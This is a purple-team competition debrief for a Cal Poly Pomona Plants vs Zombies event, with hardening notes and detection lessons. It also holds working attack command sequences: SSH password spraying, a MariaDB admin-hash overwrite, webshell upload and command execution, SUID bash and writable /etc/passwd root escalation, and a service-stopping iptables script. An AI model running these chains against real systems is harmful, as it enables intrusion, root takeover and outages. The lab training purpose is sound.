# PvP 11/14 Debrief — Plants vs Zombies

**Extensive learning README for Cal Poly Pomona Purple vs Purple (SWIFT Plants vs Zombies)**  
**Date:** Saturday, Nov 14, 2026 (America/Los_Angeles)  
**Team:** Outside **#38** / **pvp_team_14** (SEV + 3 teammates)

> Interactive canvas version (same content, tabbed):  
> https://cursor.com/canvas/store-cbb7d87f-f3f6-4b05-842d-32a1949bbc8b/915c9674-cfda-46d1-b6ea-35c1a930ee27

**Sources:** Session coaching chat (Nov 14 2026), competition briefing / Quotient scoring notes, `ORGANIZER_ANSWER_KEY.md` (planted findings on cherrybomb / FTP).

**Notes for readers**

- Lab defaults shown (`Password123!`, `sunflower123`, `tacotacotaco`, `password`, etc.) were **competition plants** — not personal secrets.
- Placement and final score are **intentionally omitted** (not invented).
- This is a purple-team learning doc: what worked, what failed, why, and how to harden.

---

## Table of contents

1. [At a glance](#at-a-glance)
2. [Environment, scope & scoring](#environment-scope--scoring)
3. [Rules that kept biting us](#rules-that-kept-biting-us)
4. [Day timeline](#day-timeline)
5. [Worked vs failed (summary)](#worked-vs-failed-summary)
6. [Defend box-by-box](#defend-box-by-box)
7. [Offense timeline](#offense-timeline)
8. [Kill chain A — peashooter SSH](#kill-chain-a--peashooter-ssh-spray)
9. [Kill chain C — MariaDB → webshell](#kill-chain-c--mariadb--admin-overwrite--webshell)
10. [Kill chain D — team 43 SUID](#kill-chain-d--team-43-suid-bash)
11. [Kill chain E — team 62 writable passwd (last flag)](#kill-chain-e--team-62-writable-passwd-last-flag)
12. [Every failure + root cause](#every-failure--root-cause)
13. [43 vs 62 privesc comparison](#43-vs-62-privesc-comparison)
14. [Critical command sequences](#critical-command-sequences)
15. [Answer-key #1–#7 map](#organizer-answer-key-17-map)
16. [ATT&CK-plain technique table](#attck-plain-technique-table)
17. [Blue harden checklist](#blue-harden-checklist-as-of-end-of-comp)
18. [Service-stop endgame](#service-stop--iptables-endgame)
19. [SIEM-room lessons / next training](#siem-room-lessons--next-training)

---

## At a glance

| Metric | Value | Detail |
|--------|-------|--------|
| Peashooter flags | Many | SSH spray early on `.54` |
| Full web chains | 2 | Teams **43** + **62** |
| Novel privescs | 2 | SUID bash + writable `/etc/passwd` |
| Clock out | ~4pm PT | Service-kill try on 62 |

---

## Environment, scope & scoring

| Field | Value |
|-------|-------|
| Event | Cal Poly Pomona Purple vs Purple — SWIFT Plants vs Zombies |
| Date | Saturday, Nov 14, 2026 (America/Los_Angeles) |
| Team | Outside #38 / pvp_team_14 (SEV + 3 teammates) |
| Scorer | Quotient at `http://172.16.13.1` — scoring engine, **NOT** a router. Routers are `172.16.1XX.1`. |
| Own net | `192.168.1.50–54` (defend these). Attack others at `172.16.XX.50–54` (XX = team #). |
| Out of scope | Never touch routers (`.1`) or Kali attack boxes (`.2`). |
| Grace | ~30 minutes harden-only, then attack opens. |
| Scoring mix | Service uptime (Quotient PCRs / checks stay green) + stolen flags submitted as SHA-256. Box reset costs **−200** — avoid nuke-and-pave unless you must. |
| Flag paths | **Linux:** `/root/flag.txt`, `/user/flag.txt` or `/home/user/stuff/flag.txt` (and sometimes `/root/stuff/`). **Windows:** `C:\Windows\flag.txt`. Submit via flagkeeper/submit. If the file content is already a hex hash, submit that string — **do not** `sha256sum` the file again. |

### Plant boxes

| Plant name | Suffix | OS / role | Scored / key services | Flag hunting |
|------------|--------|-----------|------------------------|--------------|
| thehouse | `.50` | Win2022 LDAP / AD | Domain controller; crazydave admin | Windows flag paths; AD creds for lateral |
| sunflower | `.51` | Win2019 SMB | SMB + Files share (Quotient checks share) | `C:\Windows\flag.txt`; share contents |
| cherrybomb | `.52` | Ubuntu: Pi-hole + Apache Crazy Dave shop | HTTP/DNS; vhost `Host: crazydave.cherrybomb.misty.view` | Web RCE → local flags; FTP tree |
| chomper | `.53` | CentOS MariaDB | crazydave DB; app user `cdapp` | DB creds → web admin overwrite (no direct `LOAD_FILE` flag) |
| peashooter | `.54` | Debian SSH | SSH | `/root/flag.txt` + user flag after login |

### Quotient PCR note

Quotient does **protocol/content checks** (PCR-style), not just “port open.” Examples that bit us:

- SMB port up but **Files share missing** → red
- DNS resolving the shop hostname to **`0.0.0.0`** → HTTP/DNS red
- Scorer IP `172.16.13.1` blocked by firewall → everything red

Always allow the scorer and LAN before broad drops. Docker-published ports and Pi-hole can bypass or short-circuit `ufw` assumptions.

---

## Rules that kept biting us

1. Scope is only `.50–.54` of each team net — not `.1` (router) and not `.2` (Kali).
2. Uptime matters as much as flags. Killing your own scored services while “hardening” loses points continuously.
3. Reset penalty (−200) means prefer surgical fixes over reimaging mid-match.
4. DoS / service-stop on opponents: only if the briefing allows. Flags usually score more cleanly than ambiguous red-boxing in the last minutes.
5. Host-header vhosts: hitting `http://IP/` without `Host: crazydave.cherrybomb.misty.view` often fails or hits the wrong site.

---

## Day timeline

Approximate America/Los_Angeles phases from the session (not a scored placement log).

### 1. Grace (~morning / first ~30 min)

Firewall Windows RemoteAddress blocks + Linux `ufw` (scorer first). Cherrybomb `.htaccess` on `uploads/` and `admin/`. Check Quotient greens. Do **not** lock peashooter without console break-glass.

### 2. Early offense — peashooter spray

Hydra/common SSH against many `172.16.XX.54` while defaults lived. Hits included teams such as **81, 56, 33, 35, 57, 30, 42, 94, 34, 37, 38, 32** (and peers). Submit flags immediately.

### 3. Defend friction (mid)

- Sunflower Quotient false-red until **Files share** recreated.
- Pi-hole blocked shop hostname → `0.0.0.0`; `pihole allow` restored score.
- Own peashooter **lockout** after password harden.
- Chomper assessed held by SEV.

### 4. Web/DB discovery

`nmap` found open `3306` (e.g. `35.53`, `43.53`) and HTTP on `43.52`. MariaDB TLS **ERROR 2026** until `--ssl=0`. `cdapp` / `Password123!` worked; `root@MariaDB` denied. `LOAD_FILE` flag **NULL**.

### 5. Team 43 full chain

`UPDATE` admin MD5 → login → `image=@*.phtml` → www-data → **SUID bash `-p`** → root + user flags submitted.

### 6. Late afternoon (~3:50–4:00pm PT) — team 62

Same DB→shell. SMB `62.51` locked. Docker.sock denied. **Writable `/etc/passwd`** → root flag `3bed0c79…44103`. Service stop/iptables attempted with minutes left. Competition ended ~4pm PT.

---

## Worked vs failed (summary)

### What worked

| Win | Why |
|-----|-----|
| Peashooter SSH spray early | Commons still live → many `.54` flags before rotations |
| MariaDB `cdapp` + `--ssl=0` | `UPDATE` admin to `MD5('hacked')` → reliable admin session |
| Upload artifacts exact | Host header + field `image=` + `.phtml` (not `.php` / not `file=`) |
| Team 43 SUID `/usr/bin/bash` | `bash -p` → euid=0 → both flags |
| Team 62 world-writable `/etc/passwd` | UID 0 append + python `os.setuid(0)` → root flag |
| Login SQLi `admin' --` | 302 + session without password (answer-key #1) |
| Pi-hole allow + SMB Files recreate | Restored our own Quotient greens |

### What failed or burned clock

| Miss | Why |
|------|-----|
| Late Hydra / AD-user SMB sprays | 0 hits — rotated creds; last 10 minutes wasted |
| `product.php` UNION SQLi | Normal page — patched or wrong injection point |
| MySQL client TLS defaults | ERROR 2026; `--ssl-mode` wrong — need `--ssl=0` |
| `LOAD_FILE('/root/flag.txt')` | NULL — no FILE priv / AppArmor |
| Docker.sock as www-data | `root:docker` only; `sg docker` prompts password |
| SMB null/guest/common on 62.51 | ACCESS_DENIED / LOGON_FAILURE across the board |
| Hardcoded `system("id")` shell | Ignored `?c=` — need `$_GET['c']` shell |
| Mass DB/HTTP loop late | Many 000/403/503 — doors already closed |
| Own peashooter lockout | Hardened passwords without console recovery |

---

## Defend box-by-box

### Defend phase — goal

Keep Quotient green for scorer `172.16.13.1` and LAN, while denying remote attackers on `172.16.other`. First-match order on `ufw` matters. Docker-published listeners and Pi-hole DNS can make “ufw deny” look safe when traffic still flows or names still break.

---

### thehouse (`.50`) — Win2022 AD / LDAP

| Field | Value |
|-------|-------|
| Role | Domain controller; crazydave domain admin plant |
| What we did | Windows firewall Block rules for remote team address ranges; leave scorer + LAN. Avoid breaking LDAP checks Quotient expects. |
| Plant risk | Answer key notes LDAP encryption none on DC — credential sniff / relay risk if someone is on-path. Harden passwords; prefer LDAPS if scoring still passes. |
| Outcome | Firewall partial; AD remained a high-value target we spent little late-game time attacking on others once web/DB paid. |

**Why AD matters:** Owning `.50` unlocks Windows lateral (SMB/WinRM/RDP) with real domain creds. We mostly won on Linux web/DB instead — but blue must still rotate crazydave and disable guest/null on related Windows boxes.

---

### sunflower (`.51`) — Win2019 SMB

Quotient went false-red even when SMB ports looked up. Root cause: the scored **Files** share was missing/broken after hardening. Recreating the Files share returned green. Scoring cares about share presence and PCR content, not only 445 open.

| Symptom | Cause | Fix | Lesson |
|---------|-------|-----|--------|
| Quotient SMB red | Files share gone / misnamed after lockdown | Recreate Files share Quotient expects | Test score after every harden step |
| Want to block attackers | Broad firewall / guest disable | Block remote ranges; keep scorer; no guest | Strong auth ≠ delete the share |

**Status:** Files share restored → green again.

---

### cherrybomb (`.52`) — Ubuntu Pi-hole + Crazy Dave shop

Highest-friction defend box: Apache vhost + Pi-hole DNS + uploads + admin panel. Host header `crazydave.cherrybomb.misty.view` is required for the shop app.

#### Firewall / ufw

- Allow `172.16.13.1` (scorer) and `192.168.1.0/24` **first**.
- Deny other `172.16.0.0/16` (or specific enemy `/16` slices) after allows.
- Remember: Docker-published ports and some Pi-hole paths can bypass ufw — verify with Quotient, not only `ufw status`.

#### .htaccess hardening

| Path | Intent | Outcome |
|------|--------|---------|
| `uploads/.htaccess` | Deny PHP / engine execution in upload dir | Hardened |
| `admin/.htaccess` | LAN-only admin | Hardened |
| Still found `s.php` | Webshell from `172.16.34.2` already dropped / alternate path | Clean after detect |

**Incident:** Finding an enemy webshell (`s.php`) means patch + rotate creds + check cron/persistence — `.htaccess` alone does not remove files already written.

#### Pi-hole outage (scoring breaker)

1. **Symptom:** HTTP/DNS Quotient red; shop hostname unhealthy.
2. **Root cause:** `crazydave.cherrybomb.misty.view` resolved to `0.0.0.0` because Pi-hole blocked / null-routed the name.
3. **Fix:** `pihole allow` (allowlist the hostname) so DNS returns the real cherrybomb address again.
4. **Result:** Scored services went green again. Never block your own vhost names.

```bash
# Concept — restore shop name after Pi-hole block
pihole allow crazydave.cherrybomb.misty.view
# then verify resolution != 0.0.0.0 and Quotient HTTP/DNS green
```

#### Host header & ORGANIZER_ANSWER_KEY

Without `Host: crazydave.cherrybomb.misty.view`, curls against the raw IP often miss the Crazy Dave vhost. We left `ORGANIZER_ANSWER_KEY.md` in place (planted learning doc). On offense it was readable via FTP/web trees and taught intended bugs.

---

### chomper (`.53`) — CentOS / MariaDB

| Field | Value |
|-------|-------|
| SEV assessment | Called secure / held on our plant |
| Contrast on offense | Many other teams left 3306 reachable with `cdapp` / `Password123!` — that single misconfig unlocked entire web chains. |
| Blue must-dos | `bind-address` to LAN or socket only; strong unique cdapp password; no remote root; revoke FILE; network firewall deny foreign 3306; require TLS with a client that matches (and still keep Quotient DB PCR green). |

**Status:** Our chomper held — enemy chompers often did not.

---

### peashooter (`.54`) — Debian SSH

We rotated / locked passwords (correct idea against spray) but lost our own SSH access. Recovery path became GRUB/console/Green Team — expensive mid-match. Harden with a known break-glass local console password stored offline, or a second admin key, before closing the only door.

| Action | Intent | What broke | Better pattern |
|--------|--------|------------|----------------|
| Change user/password from plant defaults | Stop hydra sprays | Team locked out of own `.54` | Change + verify login + keep console path |
| sshd hardening | Reduce auth surface | If PermitRootLogin/PasswordAuth flipped wrong, lockout | Change one knob, retest Quotient + SSH |

**Status:** Locked out after harden — lesson learned.

---

### Defend outcomes rollup

| Box | What worked | What broke scoring / ops | Fix |
|-----|-------------|--------------------------|-----|
| thehouse | Remote range blocks | Overblock risk to AD PCR | Allow scorer + LAN first |
| sunflower | Auth lockdown | Files share missing → red | Recreate Files share |
| cherrybomb | .htaccess + later shell cleanup | Pi-hole → 0.0.0.0; enemy s.php | pihole allow; delete shells |
| chomper | Held (SEV) | — | Keep remote DB closed |
| peashooter | Defaults removed | Self-lockout | Break-glass before rotate |

---

## Offense timeline

| Phase (PT) | Focus | Major attempts | Result |
|------------|-------|----------------|--------|
| Post-grace / midday | Spray | Hydra commons on many `.54`; grab `/root` + user flags; submit | Many peashooter flags |
| Mid | Windows probes | SMB null/guest/common; AD-flavored hydra on some `.51` | Mostly miss / rotate |
| Mid–afternoon | DB/HTTP recon | nmap 3306/80; mysql TLS pain; cdapp success; LOAD_FILE fail | Foothold path found |
| Afternoon | Team 43 | UPDATE admin → upload `.phtml` → SUID bash → flags | Root + user |
| ~3:50pm | Team 62 pivot | Same web chain; SMB 139/445/3389 open but auth fail; docker deny | www-data only at first |
| Last ~10 min | Novel + spray | Writable passwd root; late hydra 0 passwords; mass DB loop 403/503 | 62 root flag |
| Last ~4 min | Endgame | systemctl stop + iptables DROP 80/22/53 on 62 | Attempted; clock out |

---

## Kill chain A — peashooter SSH spray

**WHY it worked:** Valid Accounts. Many teams left Debian SSH on plant defaults (example confirmed early: `81.54` `user:password`). SSH auth succeeds → shell → read flag paths → submit hash string.

### Steps

1. **Build small user/pass lists from plants + commons** — `user`, `root`, `admin`, plant character names; `password`, `Password123!`, `sunflower123`, etc.
2. **Spray fast with stop-on-success** — `hydra -L users -P passes -t 4 -f ssh://172.16.XX.54`
3. **On hit, read flags immediately** — `cat /root/flag.txt /user/flag.txt`; `find /home /root -name flag.txt -exec cat {} \;`
4. **Submit and move** — Do not linger — defaults die as teams rotate.

```bash
# Early spray pattern (lab defaults)
hydra -l user -p password -t 4 -f ssh://172.16.81.54
# on hit:
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@172.16.81.54 \
  'cat /root/flag.txt /user/flag.txt 2>/dev/null; find /home /root -name flag.txt -exec cat {} \;'
```

**Why late sprays died:** Same technique near 4pm returned “0 passwords found.” Teams rotated. Burning hydra on AD usernames + long pass lists against SMB/SSH at the end was opportunity cost vs novel privesc on boxes we already owned.

---

## Kill chain C — MariaDB → admin overwrite → webshell

Main web kill chain (teams **43** then **62**).

**WHY:** Remote MariaDB with plant app creds is equivalent to owning the web app’s password store. Crazy Dave stored local users as MD5; `UPDATE` lets you set a known password, then unrestricted admin upload drops a webshell (Ingress Tool Transfer).

```
nmap (3306+80) → cdapp DB (Password123!) → UPDATE MD5 (admin=hacked)
  → PHP session (302→/admin) → upload (image=.phtml) → www-data RCE (Host vhost)
```

### Artifacts that had to be exact

| Artifact | Wrong | Right | Why |
|----------|-------|-------|-----|
| MySQL TLS | default client / `--ssl-mode=…` | `--ssl=0` | MariaDB client dialect; ERROR 2026 otherwise |
| DB user | `root` | `cdapp` / `Password123!` | root denied; app user had enough privs |
| Host header | bare IP | `Host: crazydave.cherrybomb.misty.view` | Name-based vhost |
| Upload field | `-F file=@…` | `-F image=@…` | PHP expects `image` |
| Extension | `.php` (often 500) | `.phtml` | Still executed; bypassed some filters |
| Shell code | `system("id")` only | `system($_GET['c'])` | Hardcoded shell ignored `?c=` |
| Admin path | expect `/admin/` open | 403 until session; 200 after | AuthZ after login cookie |

```bash
# 1) Connect + overwrite admin (lab default)
mysql -h 172.16.XX.53 -u cdapp -p'Password123!' --ssl=0 crazydave -e \
  "SELECT username,password FROM users; \
   UPDATE users SET password=MD5('hacked') WHERE username='admin';"

# Observed shapes: admin/dave = MD5 hashes; player = md5('password');
# some accounts marked !ldap-account (auth elsewhere)

# 2) Login + upload
curl -s -H "Host: crazydave.cherrybomb.misty.view" -c cXX.txt \
  -d 'username=admin&password=hacked' http://172.16.XX.52/login.php -o /dev/null
curl -s -H "Host: crazydave.cherrybomb.misty.view" -b cXX.txt \
  -F "image=@/tmp/g.phtml" http://172.16.XX.52/admin/upload.php
# expect: Uploaded as g.phtml / s.phtml

# 3) RCE
curl -s -G -H "Host: crazydave.cherrybomb.misty.view" \
  --data-urlencode 'c=id; hostname; find / -name flag.txt 2>/dev/null | head' \
  "http://172.16.XX.52/uploads/g.phtml"

# Alternate: SQLi login without knowing password (answer-key #1)
curl -s -H "Host: crazydave.cherrybomb.misty.view" -c csqli.txt \
  -d "username=admin' -- &password=x" http://172.16.XX.52/login.php -D - -o /dev/null
# expect HTTP 302 + PHPSESSID
```

**Why LOAD_FILE was a dead end:** Even with cdapp, `SELECT LOAD_FILE('/root/flag.txt')` returned NULL — no FILE privilege and/or AppArmor. The durable path was web RCE, not reading flags from SQL.

---

## Kill chain D — team 43 SUID bash

**WHY:** Abuse Elevation Control Mechanism. `/usr/bin/bash` was installed setuid root. `bash -p` preserves effective uid 0, so www-data becomes root without a kernel exploit.

### Steps

1. **Enumerate** — `find / -perm -4000 2>/dev/null`; `ls -la /usr/bin/bash`
2. **Escalate** — `/usr/bin/bash -p -c 'id; cat /root/flag.txt; …'`
3. **Flags** — `/root/flag.txt` → `0423d52b…` (submit as-is). `/home/user/stuff/flag.txt` and `/root/stuff/flag.txt` → `fc6d32b1…` user flag (submitted OK).
4. **Intel** — `ORGANIZER_ANSWER_KEY.md` readable — documented intended findings #1–#7.

```bash
# From www-data webshell on 43
ls -la /usr/bin/bash
/usr/bin/bash -p -c 'id; cat /root/flag.txt; cat /home/user/stuff/flag.txt; cat /root/stuff/flag.txt'
# NOTE: if flag file content is already a hex digest, submit that string.
# sha256sum flag.txt would hash the hash — wrong.
```

**Status:** Team 43 — root + user flags via SUID bash.

---

## Kill chain E — team 62 writable passwd (last flag)

**WHY:** Account Manipulation via broken file permissions. `/etc/passwd` was mode `rw-rw-r--` (world-writable). Any local user (www-data) can append a UID 0 account. Combined with python `os.setuid(0)` from the webshell context after the account exists, we read `/root/flag.txt`.

### Detailed walkthrough of the last flag

This is the novel path that scored the final root flag on team **62** cherrybomb (`172.16.62.52`):

`3bed0c7926721685edd5643031c7448495c56f944734b4fc01d7b95018f44103`

#### 1. Foothold (same DB chain as 43)

MariaDB on `172.16.62.53` still had `cdapp` / `Password123!`. We ran:

```sql
UPDATE users SET password=MD5('hacked') WHERE username='admin';
```

Logged into the shop with `Host: crazydave.cherrybomb.misty.view`, then uploaded `g.phtml` (`system($_GET["c"])`) via admin upload field `image`. That gave a **www-data** shell. No SUID bash here (unlike 43), and `/root/flag.txt` wasn’t readable yet.

#### 2. What we looked for (dead ends first)

| Probe | Result |
|-------|--------|
| Docker socket | Existed (`srw-rw---- root:docker`) but www-data wasn’t in `docker` → `docker ps` permission denied; `sg docker` asked for Password |
| Cron / writable home | Not writable for escalation |
| SUID bash | Normal `-rwxr-xr-x` — not setuid like 43 |
| SMB on 62.51 | Ports 139/445/3389 open; null/guest/common creds all LOGON_FAILURE |
| LOAD_FILE / root paths as www-data | No |

Then:

```text
ls -la /etc/passwd → -rw-rw-r--  (world-writable)
```

That’s the bug.

#### 3. Why writable passwd = root

Linux trusts `/etc/passwd` for UID. If you can append a line with UID `0`, that account is root. Shadow can stay alone if you put a hash in the passwd password field (old-style) or use an empty password entry some configs accept.

#### 4. Exploit (what actually worked)

1. Hash a password on the box:

   ```bash
   openssl passwd -1 pwned
   # → $1$95p7GC/M$ydqlg3e7ehFJtpPUa5p/e0
   ```

2. Append a UID 0 user with the **real** crypt hash (not the placeholder word `HASH`):

   ```text
   pwned:$1$95p7GC/M$ydqlg3e7ehFJtpPUa5p/e0:0:0:root:/root:/bin/bash
   ```

3. Become root from the webshell and read the flag:

   ```python
   import os
   os.setuid(0)
   print(open("/root/flag.txt").read())
   ```

#### 5. What failed along the way (important learning)

| Attempt | Why it failed |
|---------|----------------|
| `echo 'pwned:HASH:0:0:…'` | Literal string `HASH` was never replaced with the openssl output |
| `echo 'hack::0:0::/root:/bin/bash'` (empty password) | Did not produce a usable root shell in this environment |
| First `su - pwned` style via webshell | No TTY / wrong hash line — setuid python after a correct append was the reliable path |

#### 6. Side intel on 62

- FTP `:21` listed `ORGANIZER_ANSWER_KEY.md`, `includes/`, `public/`, `sql/`.
- Internal socket scan script showed LAN roles (`.50–.54`).
- `nmap 62.51` → 139/445/3389 open but SMB auth failed.
- `rglob` for `flag.txt` only found `/root/flag.txt` on this host (no separate user flag located in time).

```bash
# Discover
curl -s -G -H "Host: crazydave.cherrybomb.misty.view" \
  --data-urlencode 'c=ls -la /etc/passwd /usr/bin/bash; getent group docker; ls -la /var/run/docker.sock' \
  "http://172.16.62.52/uploads/g.phtml"

# Hash
curl -s -G -H "Host: crazydave.cherrybomb.misty.view" \
  --data-urlencode 'c=openssl passwd -1 pwned' \
  "http://172.16.62.52/uploads/g.phtml"

# Append REAL hash (not the word HASH) then setuid read
curl -s -G -H "Host: crazydave.cherrybomb.misty.view" \
  --data-urlencode 'c=echo pwned:$1$95p7GC/M$ydqlg3e7ehFJtpPUa5p/e0:0:0:root:/root:/bin/bash >> /etc/passwd; python3 -c "import os; os.setuid(0); print(open(\"/root/flag.txt\").read())"' \
  "http://172.16.62.52/uploads/g.phtml"
```

**Blue fix for this path:** `chmod 644 /etc/passwd` (never group/world write), monitor passwd changes, and never leave admin upload → PHP in `/uploads`.

**Status:** Team 62 — root flag via writable `/etc/passwd`.

---

## Every failure + root cause

| Attempt | Observable | Root cause | What to do instead |
|---------|------------|------------|--------------------|
| Hydra AD users + pass2 → SMB 30.51 | 0 hits | Creds rotated / not plant defaults | Abandon after first clear miss near clock |
| Late SSH spray multi-user | 0 passwords / too slow | Defaults gone; list too big | Pivot to novel on owned hosts |
| product.php UNION SQLi | Normal page / no error | Patched or not injectable that vector | Use DB creds path or login SQLi |
| mysql without `--ssl=0` | ERROR 2026 SSL required | Client TLS default vs server | `--ssl=0` on this MariaDB client |
| root@MariaDB | Access denied | No remote root | cdapp plant creds |
| LOAD_FILE flag | NULL | No FILE / AppArmor | Webshell path |
| `-F file=@shell.php` | No upload / 500 | Wrong field name; `.php` filtered | `image=` + `.phtml` |
| Hardcoded id shell | Always id; ignores `?c=` | No param plumbing | `$_GET['c']` shell |
| Docker.sock | permission denied | www-data ∉ docker group | Different privesc (passwd/SUID) |
| SMB null/guest/common @ 62.51 | ACCESS_DENIED / LOGON_FAILURE | SMB lockout / strong auth | Don't force Windows if web pays |
| SUID bash on 62 | normal `-rwxr-xr-x` | Not misconfigured like 43 | Writable passwd instead |
| Mass DB UPDATE loop late | 000 / 403 / 503 | Hosts down, WAF, or patched | Only chase DB OK + HTTP 200 |
| `echo …HASH…` into passwd | No new user line | Literal placeholder not replaced | Paste openssl output exactly |

---

## 43 vs 62 privesc comparison

Same initial access (MariaDB cdapp → admin overwrite → `.phtml` as www-data). Different host misconfigs decided the escalate path.

| Dimension | Team 43 | Team 62 |
|-----------|---------|---------|
| Foothold | Chain C webshell | Chain C webshell (`g.phtml`) |
| `/usr/bin/bash` | **SUID set → `bash -p`** | Normal `-rwxr-xr-x` |
| `/etc/passwd` | Not the path we needed | **World-writable `rw-rw-r--`** |
| docker.sock | Not relied on | Present but denied to www-data |
| Privesc class | Abuse Elevation Control (SUID) | Account Manipulation (passwd) |
| Root flag | `0423d52b…` (submit as-is) | `3bed0c7926721685edd5643031c7448495c56f944734b4fc01d7b95018f44103` |
| User flag | `fc6d32b1…` under `stuff/` | rglob only found `/root/flag.txt` |
| Extra intel | ORGANIZER_ANSWER_KEY via shell | FTP answer key + LAN port script; SMB `.51` locked |
| Endgame DoS | Not the focus | systemctl + iptables attempted last minutes |

```
www-data RCE (shared start)
   ├─ if SUID  → 43: SUID bash (bash -p)  → root flags
   └─ if passwd write → 62: writable passwd (UID 0 + setuid) → root flags
```

- **43 lesson:** Always enum SUID immediately after RCE: `find / -perm -4000`. One sticky binary ends the box.
- **62 lesson:** Always enum writable sensitive files: passwd/shadow/sudoers/cron. Permissions bugs beat exotic kernel exploits in PvP.

---

## Critical command sequences

Lab-default passwords only. These are the sequences that actually produced flags.

```bash
# --- A) Peashooter (early) ---
hydra -l user -p password -t 4 -f ssh://172.16.XX.54

# --- C) MariaDB → admin → .phtml ---
mysql -h 172.16.XX.53 -u cdapp -p'Password123!' --ssl=0 -e \
  "UPDATE crazydave.users SET password=MD5('hacked') WHERE username='admin'"
curl -s -H "Host: crazydave.cherrybomb.misty.view" -c c.txt \
  -d 'username=admin&password=hacked' http://172.16.XX.52/login.php -o /dev/null
curl -s -H "Host: crazydave.cherrybomb.misty.view" -b c.txt \
  -F "image=@/tmp/g.phtml" http://172.16.XX.52/admin/upload.php

# --- D) Team 43 SUID ---
bash -p -c 'cat /root/flag.txt; cat /home/user/stuff/flag.txt'

# --- E) Team 62 writable passwd ---
openssl passwd -1 pwned
# append pwned:<crypt>:0:0:root:/root:/bin/bash to /etc/passwd via shell
python3 -c 'import os; os.setuid(0); print(open("/root/flag.txt").read())'

# --- Endgame service inhibit (rules permitting) ---
python3 -c 'import os; os.setuid(0); os.system("systemctl stop ssh apache2 pihole-FTL 2>/dev/null; iptables -I INPUT 1 -p tcp --dport 80 -j DROP; iptables -I INPUT 1 -p tcp --dport 22 -j DROP; iptables -I INPUT 1 -p tcp --dport 53 -j DROP")'
```

---

## ORGANIZER answer-key #1–#7 map

Planted findings from `ORGANIZER_ANSWER_KEY.md` (readable on shells / FTP). Map each to a red demonstration and a blue fix.

| # | Finding | Red demo | Blue fix |
|---|---------|----------|----------|
| 1 | Login SQLi | POST `username=admin' --` → 302 + session | Prepared statements; reject quotes; generic auth errors |
| 2 | Search UNION SQLi | UNION SELECT into search (planted; our `product.php` path failed — may be patched per team) | Parameterized queries; column allowlists |
| 3 | MD5 + defaults | admin/`sunflower123`, dave/`tacotacotaco`, player/`password`; or UPDATE via cdapp | Unique strong hashes (bcrypt/argon2); rotate plants day-of |
| 4 | IDOR orders | Fetch other users' order IDs | AuthZ checks on object ownership |
| 5 | Stored XSS reviews | Inject script in review field | Output encode; CSP |
| 6 | No CSRF | Forge state-changing POSTs | CSRF tokens / SameSite sessions |
| 7 | Unrestricted upload | Admin `image=@shell.phtml` → RCE | Allowlist ext+MIME; store outside webroot; no exec |
| AD | LDAP encryption none | Sniff/relay risk on `.50` | LDAPS; channel binding; rotate crazydave |

---

## ATT&CK-plain technique table

| Plain technique | Where | Evidence | Outcome |
|-----------------|-------|----------|---------|
| Valid Accounts | SSH `.54` sprays; attempted SMB | hydra `host:` lines early; late 0 passwords | Many peashooter flags / SMB fail |
| Exploit Public-Facing Application | Crazy Dave admin upload | Uploaded as `*.phtml` | www-data RCE |
| Abuse of DB credentials / SQL | chomper cdapp + login SQLi | UPDATE users; 302 on `admin' --` | Admin session |
| Ingress Tool Transfer | `/admin/upload.php` | `image=@g.phtml` | Webshell on disk |
| Abuse Elevation Control Mechanism | Team 43 `/usr/bin/bash` SUID | `bash -p`; euid=0 | Root + user flags |
| Account Manipulation | Team 62 `/etc/passwd` writable | Append UID 0; setuid read | Root flag |
| Inhibit System Recovery / Service Stop | Team 62 endgame | systemctl stop + iptables DROP | Attempted at clock |
| Network Service Discovery | nmap + in-shell socket scan | 3306/80/139/445/3389 maps | Chose next targets |

---

## Blue harden checklist (as of end of comp)

Recorded status after the match. Every successful red path maps to an open item unless noted held.

- [ ] **Rotate all plant defaults day-of** (SSH, `cdapp`/`Password123!`, admin/`sunflower123`, dave/`tacotacotaco`, player/`password`, Windows locals) — Stops spray + DB overwrite
- [ ] **Verify break-glass console/GRUB before locking peashooter** — We self-locked
- [ ] **MariaDB:** bind LAN/socket only; firewall foreign 3306; strong cdapp; no FILE; TLS aligned with Quotient PCR — Breaks chain C on others — keep ours like SEV assessed
- [ ] **Upload:** allowlist, random names, store outside webroot, disable exec/`.phtml`/`.php` in uploads, CSRF on admin — Stops finding #7
- [ ] **Prepared statements** on login + search; ban `admin' --` — Findings #1–#2
- [ ] **Password hashing upgrade off MD5**; unique per env — Finding #3
- [ ] **IDOR/XSS/CSRF fixes** on orders/reviews/POSTs — Findings #4–#6
- [ ] **Audit SUID:** `find / -perm -4000`; remove bash SUID — Blocks 43-style
- [ ] **`chmod 644 /etc/passwd`**; 640 shadow; integrity monitor — Blocks 62-style
- [x] **Keep www-data out of docker**; socket `root:docker` only — Held on 62
- [x] **Pi-hole allowlist own vhost names**; never `0.0.0.0` the shop — Fixed mid-event
- [x] **SMB:** Files share present for Quotient; no guest/null; strong auth — Share fix + 62.51 held vs us
- [ ] **Firewall:** allow `172.16.13.1` + LAN first; remember Docker bypass — Uptime + defense
- [ ] **Post-compromise:** delete enemy shells (`s.php`), rotate, check cron/persistence — Seen from `172.16.34.2`
- [ ] **LDAPS / encrypt LDAP** on thehouse; rotate crazydave — Answer-key AD note

---

## Service-stop / iptables endgame

With root on 62 and ~4 minutes left, we attempted Inhibit System Recovery / Service Stop: stop `ssh`, `apache2`, `pihole-FTL`/named; iptables INPUT DROP for TCP 80/22/53. Intent: drive opponent Quotient red.

**Caution:** Many PvP rulesets ban pure DoS; scoring impact vs flag points is briefing-dependent. Never target `.1`/`.2`. Prefer confirm rules before mass service kills earlier in the day.

```bash
# Conceptual endgame from root context on cherrybomb
systemctl stop ssh apache2 pihole-FTL 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 80 -j DROP
iptables -I INPUT 1 -p tcp --dport 22 -j DROP
iptables -I INPUT 1 -p tcp --dport 53 -j DROP
# Competition ended shortly after; treat as attempted, not a scored claim.
```

**Status:** Attempted on 62 near clock — verify DoS rules next event before planning red-box strategy.

---

## SIEM-room lessons / next training

Pitch this debrief as a purple-team lab hour: each detection should catch one successful path from today.

1. **Alert on remote MariaDB logins** from non-LAN subnets and on `UPDATE` against auth tables — that was our whole web chain.
   - Correlate 3306 success → HTTP admin login from same attacker net → multipart upload to `/admin/upload.php`
2. **Web:** alert on `.phtml`/`.php` writes under `uploads/` and on Host-header hits to `crazydave.cherrybomb.misty.view` from foreign `/16`s.
3. **Linux:** FIM on `/etc/passwd` mode/owner and on unexpected SUID bits under `/usr/bin`.
4. **SSH:** spike detection for hydra-like failures then one success across many `.54` peers (spray pattern).
